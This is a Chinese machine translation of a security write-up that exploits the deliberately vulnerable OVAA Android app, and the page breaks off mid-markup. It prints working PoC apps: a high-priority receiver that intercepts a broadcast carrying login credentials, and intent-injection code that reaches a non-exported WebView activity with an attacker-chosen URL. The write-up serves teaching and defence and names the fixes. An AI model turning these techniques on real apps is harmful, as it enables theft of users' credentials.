<html>
<head>
<title>Exploiting Android Vulnerabilities with Malicious Third-Party Apps (featuring Oversecured APK)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">恶意第三方应用程序利用Android漏洞(包括过度安全的APK)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploiting-android-vulnerabilities-with-malicious-third-party-apps-featuring-oversecured-apk-adea3241ce49?source=collection_archive---------0-----------------------#2022-07-15">https://infosecwriteups.com/exploiting-android-vulnerabilities-with-malicious-third-party-apps-featuring-oversecured-apk-adea3241ce49?source=collection_archive---------0-----------------------#2022-07-15</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/7561ee7265e6e7bec9942478a2f19c1c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*n1yFTcrLilws9YyMHNA66A.png"/></div></div></figure><p id="fb0f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如今，移动应用已经成为一种趋势，因为一些快速增长的公司和初创公司已经迈出了进入数字世界的步伐，将他们的业务扩展到APK或T2的IPA T3。他们一点也不知道，很可能有一个漏洞暴露在里面，可以被一个未知的对手操纵，他们可能会利用他们的优势。</p><p id="3e1e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在这篇文章中，我想向你展示这样一个第三方应用程序是如何影响一个具有易受攻击的安全设计的应用程序的，尤其是在Android中。我选择的APK的范围将是一个<a class="ae kw" href="https://github.com/oversecured/ovaa" rel="noopener ugc nofollow" target="_blank">过度保护的</a> APK，可以从他们的官方<strong class="ka ir"> Github </strong>下载。</p><p id="2ae8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这个APK中存在18个漏洞，但我想向您展示其中的一些，使用我们自己手动构建的第三方应用程序，使用<a class="ae kw" href="https://developer.android.com/studio" rel="noopener ugc nofollow" target="_blank"><strong class="ka ir">Android Studio</strong></a><strong class="ka ir"/>和<a class="ae kw" href="https://www.genymotion.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir"> Genymotion </strong> </a>作为仿真器，可以轻松利用这些漏洞。</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><blockquote class="le"><p id="43d8" class="lf lg iq bd lh li lj lk ll lm ln kv dk translated"><strong class="ak">通过IPC机制进行不安全的“对话”</strong></p></blockquote><figure class="lo lp lq lr ls jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/539f1edd8aa198c1b6d49bbd2206ccbf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2PbqavyOaZNfwTN8-olc-A.png"/></div></div></figure><p id="f1f6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Android中的IPC机制相当复杂，不同的IPC意味着不同的安全处理。最常见的叫做<a class="ae kw" href="https://developer.android.com/guide/components/intents-filters?hl=en" rel="noopener ugc nofollow" target="_blank">意图</a>。这种机制允许应用程序具有多种功能，例如在一个应用程序和另一个应用程序之间共享数据，将某些数据作为参数从一个<a class="ae kw" href="https://developer.android.com/reference/android/app/Activity" rel="noopener ugc nofollow" target="_blank">活动</a>传递到另一个活动，等等。这里的攻击场景可能是什么？我们将会看到以下三种可能发生的剥削:</p><ol class=""><li id="fef6" class="lt lu iq ka b kb kc kf kg kj lv kn lw kr lx kv ly lz ma mb bi translated"><strong class="ka ir">意图重定向</strong></li><li id="67d4" class="lt lu iq ka b kb mc kf md kj me kn mf kr mg kv ly lz ma mb bi translated"><strong class="ka ir">意向注射</strong></li><li id="5a5c" class="lt lu iq ka b kb mc kf md kj me kn mf kr mg kv ly lz ma mb bi translated"><strong class="ka ir">意图欺骗</strong></li></ol><p id="4e50" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">为了静态地分析APK，我将使用<a class="ae kw" href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir">移动安全框架(MobSF) </strong> </a>。也可以尝试使用<a class="ae kw" href="https://github.com/skylot/jadx" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir"> JADX-GUI </strong> </a>或者<strong class="ka ir"> JD-GUI </strong>。</p><p id="b6c9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们将从<strong class="ka ir">意图重定向</strong>开始。首先，在信息安全术语中，这实际上被称为<strong class="ka ir">开放重定向</strong>，但这种攻击的主要目的主要是检索某种信息，作为从一个合法应用程序传递给我们的恶意应用程序<strong class="ka ir">的可能是机密的参数，或者获取对受保护组件的访问权限</strong>。</p><p id="ab1a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">一个常见的潜在攻击是当一个声明的组件在应用程序内部被<strong class="ka ir">导出</strong>时。您可能会从带有XML扩展名的<strong class="ka ir"> Android Manifest </strong>文件中注意到它。然而，并不是每个组件都需要声明为"<strong class="ka ir"> android:exported </strong>"，如果其中有一个<strong class="ka ir"> intent-filter </strong>的话，我们也可以断定该活动是导出的。您会惊讶地发现，无论是否导出，清单中声明的SDK最低版本也会影响它的行为。</p><p id="e75d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">意图注入</strong>发生在攻击者可能将一个<strong class="ka ir">意图</strong>本身作为一个<strong class="ka ir">可打包的</strong>类对象注入到另一个意图中作为额外的数据，因此其影响也可能潜在地获得对受保护组件的访问权。有几项研究将这种技术称为重定向，但我将在这里从不同的角度来看待它。</p><p id="936d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">当启动我们的<strong class="ka ir"> MobSF，</strong>时，我们会看到它已经总结了组件信息，应用程序由5个活动、1个服务、1个接收者和3个提供者组成。</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mh"><img src="../Images/e9e05aa880db01b38adf5208606b579c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DMJvEW4YBc4Wt4D9E-q6pw.png"/></div></div></figure><p id="7b63" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">该应用程序也非常简单，它只提示您登录，您可以自由地展示内部实现的设计缺陷。</p><p id="0c34" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">查看Android清单文件可以发现，该应用程序允许的最低SDK版本是<strong class="ka ir">过时的</strong>。如果允许的话，应用程序还能够<strong class="ka ir">读写外部存储器</strong>，这可能是危险的，因为如果有恶意，它可能会修改另一个应用程序的完整性。</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/a6dd088dbb6762eb8022d1bf070e0df8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1398/format:webp/1*6li5hkHZqpkjlBHogE4lvA.png"/></div></figure><p id="e59c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">有一个入口活动来检查我们是否已经登录，主活动是默认活动。</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/f064869f846f1889e2271ddb716c164c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1372/format:webp/1*MzafQPtzHv5YOLVykH6azQ.png"/></div></figure><p id="4068" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在我们快速浏览了主活动之后，我们注意到有一个<strong class="ka ir">不安全的广播</strong>使用了<strong class="ka ir">隐含的意图。</strong>这个意图是<strong class="ka ir">隐含的</strong>，因为它声明了一个特定的动作。注意，在Android 8 (Oreo)中，<strong class="ka ir">隐式意图</strong>将不再被使用，因此我们需要通过指定其组件<code class="fe mo mp mq mr b">Receiver</code>来声明一个<strong class="ka ir">显式意图</strong>。我们也可以把这个叫做<strong class="ka ir">隐式广播</strong>。</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi ms"><img src="../Images/a0be0b674b94b6ee6fe7598b335cbbea.png" data-original-src="https://miro.medium.com/v2/resize:fit:564/format:webp/1*Rsthu4iLca9KfVDimhS4jQ.png"/></div></figure><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mt"><img src="../Images/d46a7028ed4ea880ebac0f590f76b522.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*50jiicpKw1CQVWTyYcX9QQ.png"/></div></div></figure><p id="19a1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">广播中传递的数据被认为是机密的，因为这是我们的登录数据。我们可以在<strong class="ka ir"> loginUtils </strong>类上找到它，并找到<strong class="ka ir"> getLoginData </strong>方法。</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mu"><img src="../Images/0154f9e30129a4a6b73e979aadd76aef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y6a1RIpkW6K3ImqH8zUPrA.png"/></div></div></figure><p id="99ee" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以看到，数据存储在一个<a class="ae kw" href="https://www.tutorialspoint.com/android/android_shared_preferences.htm" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir">共享首选项</strong> </a>中，并且是<strong class="ka ir">未加密的。</strong>这不是最佳实践，尤其是当我们谈论Android中的加密时，因为它没有任何加密方法，所以当攻击者收到这些登录数据时，它可以以纯文本格式显示。对于更多的Android加密实践，我会推荐从<a class="ae kw" href="https://www.raywenderlich.com/778533-encryption-tutorial-for-android-getting-started#toc-anchor-001" rel="noopener ugc nofollow" target="_blank"> Ray Wenderlich网站</a>阅读。</p><p id="5354" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">另一个令人惊讶的事实是，开发人员在收到广播后忘记做一些事情。这种迹象表明，攻击者可以通过<strong class="ka ir">拦截广播意图，</strong>将登录数据重定向到我们的恶意应用程序，从而轻松窃取登录数据。</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi mv"><img src="../Images/dbeb243ab0380bbf6de987fa6bd2fa73.png" data-original-src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Kt1GxBJq3FNMyfhS__1ulQ.png"/></div></figure><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mw"><img src="../Images/18b55b5ddffcd0ea20a483c8831f2d1d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Dj6aEdPePHUjxUwdq4tEKw.png"/></div></div></figure><p id="5934" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">制作恶意应用程序的想法非常简单。我们可以注册我们自己的<code class="fe mo mp mq mr b">Broadcast Receiver</code>，并将其优先级设置为<strong class="ka ir"> 999 </strong>，以便首先将<code class="fe mo mp mq mr b">payload</code>数据从广播意图重定向到我们的应用程序，因为它具有最高优先级。</p><pre class="mi mj mk ml gt mx mr my mz aw na bi"><span id="2d08" class="nb nc iq mr b gy nd ne l nf ng">&lt;?xml version="1.0" encoding="utf-8"?&gt;<br/>&lt;manifest xmlns:android="<a class="ae kw" href="http://schemas.android.com/apk/res/android" rel="noopener ugc nofollow" target="_blank">http://schemas.android.com/apk/res/android</a>"<br/>    package="com.evil.oversecuredbroadcast"&gt;</span><span id="82da" class="nb nc iq mr b gy nh ne l nf ng">&lt;application<br/>        android:icon="<a class="ae kw" href="http://twitter.com/mipmap/ic_launcher" rel="noopener ugc nofollow" target="_blank">@mipmap/ic_launcher</a>"<br/>        android:label="<a class="ae kw" href="http://twitter.com/string/app_name" rel="noopener ugc nofollow" target="_blank">@string/app_name</a>"<br/>        android:roundIcon="<a class="ae kw" href="http://twitter.com/mipmap/ic_launcher_round" rel="noopener ugc nofollow" target="_blank">@mipmap/ic_launcher_round</a>"<br/>        android:supportsRtl="true"<br/>        android:theme="<a class="ae kw" href="http://twitter.com/style/Theme" rel="noopener ugc nofollow" target="_blank">@style/Theme</a>.MyApplication"&gt;<br/>        &lt;receiver<br/>            android:name=".EvilReceiver"<br/>            android:enabled="true"<br/>            android:exported="true"&gt;<br/>            &lt;intent-filter android:priority="999"&gt;<br/>                &lt;action android:name="oversecured.ovaa.action.UNPROTECTED_CREDENTIALS_DATA"&gt;<br/>                &lt;/action&gt;<br/>            &lt;/intent-filter&gt;<br/>        &lt;/receiver&gt;</span><span id="6a90" class="nb nc iq mr b gy nh ne l nf ng">&lt;activity android:name=".MainActivity"&gt;<br/>            &lt;intent-filter&gt;<br/>                &lt;action android:name="android.intent.action.MAIN" /&gt;</span><span id="d57a" class="nb nc iq mr b gy nh ne l nf ng">&lt;category android:name="android.intent.category.LAUNCHER" /&gt;<br/>            &lt;/intent-filter&gt;<br/>        &lt;/activity&gt;<br/>    &lt;/application&gt;</span><span id="7c93" class="nb nc iq mr b gy nh ne l nf ng">&lt;/manifest&gt;</span></pre><p id="3baa" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">但是由于额外的<strong class="ka ir">有效载荷</strong>包含一个LoginData <strong class="ka ir">可串行化对象:</strong></p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/f7e4c308703ae4a31521b03386ee3a8c.png" data-original-src="https://miro.medium.com/v2/resize:fit:992/format:webp/1*QykDKjy1e0V8lBq9iJZaEA.png"/></div></figure><p id="2097" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们将使用一个<a class="ae kw" href="https://www.areizen.fr/post/exploiting_android_application_trough_serialized_intent/" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir">反射</strong> </a>方法来加载过度安全的APK包，在我们的主活动中加载它的索引和类。</p><p id="cf30" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们主要活动类的PoC。</p><pre class="mi mj mk ml gt mx mr my mz aw na bi"><span id="1bc0" class="nb nc iq mr b gy nd ne l nf ng">package com.evil.oversecuredbroadcast;</span><span id="74f4" class="nb nc iq mr b gy nh ne l nf ng">import androidx.appcompat.app.AppCompatActivity;</span><span id="40ac" class="nb nc iq mr b gy nh ne l nf ng">import android.content.pm.ApplicationInfo;<br/>import android.content.pm.PackageManager;<br/>import android.os.Bundle;</span><span id="6739" class="nb nc iq mr b gy nh ne l nf ng">import dalvik.system.DexFile;</span><span id="86e4" class="nb nc iq mr b gy nh ne l nf ng">public class MainActivity extends AppCompatActivity {</span><span id="b1d6" class="nb nc iq mr b gy nh ne l nf ng"><a class="ae kw" href="http://twitter.com/Override" rel="noopener ugc nofollow" target="_blank">@Override</a><br/>    protected void onCreate(Bundle savedInstanceState) {<br/>        super.onCreate(savedInstanceState);<br/>        setContentView(R.layout.activity_main);<br/>        Object object = null;<br/>        try{<br/>            PackageManager pm = getPackageManager();<br/>            ApplicationInfo appinfo = pm.getApplicationInfo("oversecured.ovaa",0);<br/>            DexFile df = new DexFile(appinfo.sourceDir);</span><span id="f724" class="nb nc iq mr b gy nh ne l nf ng">ClassLoader cl = getClassLoader();<br/>            Class cli = df.loadClass("oversecured.ovaa.objects.LoginData",cl);<br/>            object = cli.newInstance();</span><span id="ccfd" class="nb nc iq mr b gy nh ne l nf ng">} catch (Exception e){<br/>            e.printStackTrace();<br/>        }<br/>    }<br/>}</span></pre><p id="4253" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们的<strong class="ka ir">邪恶接收器</strong>来了。我们从加载在<strong class="ka ir">广播意图</strong>中的过度安全的APK中声明动作，并通过<code class="fe mo mp mq mr b">payload</code> extras的<strong class="ka ir"> getSerializable() </strong>接收<strong class="ka ir">序列化的</strong>数据。为了简单起见，我们将把它传递给一个记录器。</p><pre class="mi mj mk ml gt mx mr my mz aw na bi"><span id="410d" class="nb nc iq mr b gy nd ne l nf ng">package com.evil.oversecuredbroadcast;</span><span id="def6" class="nb nc iq mr b gy nh ne l nf ng">import android.content.BroadcastReceiver;<br/>import android.content.Context;<br/>import android.content.Intent;<br/>import android.util.Log;</span><span id="0d4b" class="nb nc iq mr b gy nh ne l nf ng">import java.io.Serializable;</span><span id="52f9" class="nb nc iq mr b gy nh ne l nf ng">public class EvilReceiver extends BroadcastReceiver {</span><span id="c128" class="nb nc iq mr b gy nh ne l nf ng"><a class="ae kw" href="http://twitter.com/Override" rel="noopener ugc nofollow" target="_blank">@Override</a><br/>    public void onReceive(Context context, Intent intent) {<br/>        // TODO: This method is called when the BroadcastReceiver is receiving<br/>        // an Intent broadcast.<br/>        if(intent != null) {<br/>            if("oversecured.ovaa.action.UNPROTECTED_CREDENTIALS_DATA".equals(intent.getAction())){<br/>                Log.d("evilreceiver","" + intent.getExtras().getSerializable("payload"));<br/>            }<br/>            else{<br/>                Log.d("evilreceiver","Not yet intercepted");<br/>            }<br/>        }else{<br/>            Log.d("evilreceiver","No intent");<br/>        }<br/>        throw new UnsupportedOperationException("Not yet implemented");<br/>    }<br/>}</span></pre><p id="97d8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">最后，我们产生了OVAA应用程序和恶意应用程序，登录到OVAA，点击第二个按钮发送广播，以便我们的恶意应用程序接收它。虽然我们的应用程序正在崩溃(我不知道为什么会这样，但也许你知道，请随意评论！)，然而登录数据是使用包含电子邮件和密码的<code class="fe mo mp mq mr b">adb logcat</code>在日志内显示的<strong class="ka ir">。</strong></p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nj"><img src="../Images/3420819fcbb8686fc3153d0708a0eb9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5qoMQtqflMPjUCHVz_jTvw.png"/></div></div></figure><p id="44f8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">所以在这种情况下，我们应该<strong class="ka ir">永远不要使用隐含意图</strong>来发送<strong class="ka ir">广播。</strong>我们需要使用一个<strong class="ka ir">显式广播</strong>和一个<strong class="ka ir">签名许可级别</strong>。</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="a8d3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">下一个漏洞更有趣，让我们再看一下<strong class="ka ir"> Android清单</strong>，这一次，我们将重点关注登录活动。</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/2d8c92f60cd6dfaf7a06e0f8becf5e4f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1262/format:webp/1*x4E3jrd5Zpd1U1-atN88Kg.png"/></div></figure><p id="8532" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">由于发生了<strong class="ka ir">意图过滤</strong>，该活动默认为<strong class="ka ir">导出</strong>。如果我们看到源代码，</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nl"><img src="../Images/0c464f8580f772ab1848d025a218e133.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7HuOdFpomnqLSycafyvdQA.png"/></div></div></figure><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nm"><img src="../Images/25d1a7397bc80c2db34363110bdaa573.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HCT1oViruFsN8MQcYWgPGQ.png"/></div></div></figure><p id="223c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在我们被提示登录后，实际上会有一个检查器来检查是否有一个<strong class="ka ir">意图</strong>通过了一个额外的<code class="fe mo mp mq mr b">redirect_intent</code>。这也是非常危险的，因为我们可以<strong class="ka ir">向<strong class="ka ir">注入恶意意图</strong>来获得对受保护组件</strong>的访问，例如受保护的活动。</p><p id="c52a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们还可以在<strong class="ka ir"> processLogin </strong>中看到另一个导致<strong class="ka ir">信息泄露</strong>的漏洞，其中存在一个带有调试标记的日志记录器。一个寻找字符串<code class="fe mo mp mq mr b">ovaa</code>的<code class="fe mo mp mq mr b">adb logcat</code>命令可能会泄露我们以“处理”前缀开始的登录数据。</p><p id="eb24" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">因为我们可以将意图传递给LoginActivity类，所以我们必须找出目标活动，以便获得完全的访问优势。我们可以看到有一个受保护的组件，一个<strong class="ka ir">未导出的活动，</strong> WebView活动。</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nn"><img src="../Images/27dad7db606d1e419a6c7298ec03abff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*astBtaPN6WSOAYkwu9navw.png"/></div></div></figure><p id="d1f2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果我们再看一下源代码，</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi no"><img src="../Images/dbb43fe26023178a0ce1592f756d57b5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1228/format:webp/1*87dRgWNzpOOAI34kgL7OwQ.png"/></div></figure><p id="645b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae kw" href="https://www.techtarget.com/searchsecurity/definition/Android-Webview" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir"> WebView </strong> </a>将从额外的<code class="fe mo mp mq mr b">url</code>意向数据中加载自定义URL。这样，我们就能设计出攻击场景。我们可以<strong class="ka ir">强制</strong>登录活动接受一个包含<strong class="ka ir">恶意网站</strong>的<code class="fe mo mp mq mr b">url</code>额外意图，并将其传递给来自登录活动意图的<code class="fe mo mp mq mr b">redirect_intent</code>额外意图。我们可以从任何应用程序启动登录活动，因为它是<strong class="ka ir">导出的。</strong></p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/9e7e42cb9ba317839fb49733282c6f6a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*k-W5SsbAf1lhKqBUlYalxw.png"/></div></div></figure><p id="f7d3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们伪造我们的恶意应用程序。</p><pre class="mi mj mk ml gt mx mr my mz aw na bi"><span id="f44d" class="nb nc iq mr b gy nd ne l nf ng">&lt;?xml version="1.0" encoding="utf-8"?&gt;<br/>&lt;manifest xmlns:android="<a class="ae kw" href="http://schemas.android.com/apk/res/android" rel="noopener ugc nofollow" target="_blank">http://schemas.android.com/apk/res/android</a>"<br/>    package="com.evil.evilintentaccessprotectedovaa"&gt;</span><span id="ae67" class="nb nc iq mr b gy nh ne l nf ng">&lt;application<br/>        android:allowBackup="true"<br/>        android:icon="<a class="ae kw" href="http://twitter.com/mipmap/ic_launcher" rel="noopener ugc nofollow" target="_blank">@mipmap/ic_launcher</a>"<br/>        android:label="<a class="ae kw" href="http://twitter.com/string/app_name" rel="noopener ugc nofollow" target="_blank">@string/app_name</a>"<br/>        android:roundIcon="<a class="ae kw" href="http://twitter.com/mipmap/ic_launcher_round" rel="noopener ugc nofollow" target="_blank">@mipmap/ic_launcher_round</a>"<br/>        android:supportsRtl="true"<br/>        android:theme="<a class="ae kw" href="http://twitter.com/style/Theme" rel="noopener ugc nofollow" target="_blank">@style/Theme</a>.Evilintentaccessprotectedovaa"&gt;<br/>        &lt;activity android:name=".MainActivity" android:exported="true"&gt;<br/>            &lt;intent-filter&gt;<br/>                &lt;action android:name="android.intent.action.MAIN" /&gt;</span><span id="f3f6" class="nb nc iq mr b gy nh ne l nf ng">&lt;category android:name="android.intent.category.LAUNCHER" /&gt;<br/>            &lt;/intent-filter&gt;<br/>        &lt;/activity&gt;<br/>    &lt;/application&gt;</span><span id="b4d8" class="nb nc iq mr b gy nh ne l nf ng">&lt;/manifest&gt;</span></pre><p id="4c7a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">App的<strong class="ka ir"> PoC </strong>:</p><pre class="mi mj mk ml gt mx mr my mz aw na bi"><span id="9768" class="nb nc iq mr b gy nd ne l nf ng">package com.evil.evilintentaccessprotectedovaa;</span><span id="2555" class="nb nc iq mr b gy nh ne l nf ng">import androidx.appcompat.app.AppCompatActivity;</span><span id="de66" class="nb nc iq mr b gy nh ne l nf ng">import android.content.ComponentName;<br/>import android.content.Context;<br/>import android.content.Intent;<br/>import android.content.pm.PackageManager;<br/>import android.os.Bundle;</span><span id="9fa4" class="nb nc iq mr b gy nh ne l nf ng">public class MainActivity extends AppCompatActivity {</span><span id="dc51" class="nb nc iq mr b gy nh ne l nf ng"><a class="ae kw" href="http://twitter.com/Override" rel="noopener ugc nofollow" target="_blank">@Override</a><br/>    protected void onCreate(Bundle savedInstanceState) {<br/>        super.onCreate(savedInstanceState);<br/>        setContentView(R.layout.activity_main);</span><span id="0315" class="nb nc iq mr b gy nh ne l nf ng">//first intent will be prepared and targeted to protected un-exported<br/>        //activity called WebActivity. But since we'll load 2 args of intent<br/>        //that are the package name and the class, we'll create a context<br/>        //and a class loader first<br/>        Context icontext = null;<br/>        try {<br/>            icontext = createPackageContext("oversecured.ovaa",Context.CONTEXT_INCLUDE_CODE|Context.CONTEXT_IGNORE_SECURITY);<br/>        } catch (PackageManager.NameNotFoundException e) {<br/>            e.printStackTrace();<br/>        }</span><span id="b487" class="nb nc iq mr b gy nh ne l nf ng">Class iclass = null;<br/>        try {<br/>            iclass = icontext.getClassLoader().loadClass("oversecured.ovaa.activities.WebViewActivity");<br/>        } catch (ClassNotFoundException e) {<br/>            e.printStackTrace();<br/>        }</span><span id="7845" class="nb nc iq mr b gy nh ne l nf ng">//Intended solver 1-&gt; declare component and the class manually<br/>        //Intent redirectintent = new Intent(icontext,iclass);</span><span id="3028" class="nb nc iq mr b gy nh ne l nf ng">//intended solver 2<br/>        Intent redirectintent = new Intent();</span><span id="5777" class="nb nc iq mr b gy nh ne l nf ng">//this is solver 1, but it's not required for solver 2<br/>        redirectintent.setClassName("oversecured.ovaa","oversecured.ovaa.activities.WebViewActivity");<br/>        redirectintent.putExtra("url", "<a class="ae kw" href="https://petircysec.com/" rel="noopener ugc nofollow" target="_blank">https://petircysec.com/</a>");</span><span id="eab5" class="nb nc iq mr b gy nh ne l nf ng">Intent loginintent = new Intent("oversecured.ovaa.action.LOGIN");<br/>        loginintent.setClassName("oversecured.ovaa","oversecured.ovaa.activities.LoginActivity");<br/>        loginintent.putExtra("redirect_intent",redirectintent);<br/>        startActivity(loginintent);<br/>    }<br/>}</span></pre><p id="1c2c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">打开恶意应用程序会将我们重定向到extra <code class="fe mo mp mq mr b">url</code>中加载的网站。过度安全的APK将渲染我们的恶意网站。</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/24de109eb151d289432e9ec45ad1eb2d.png" 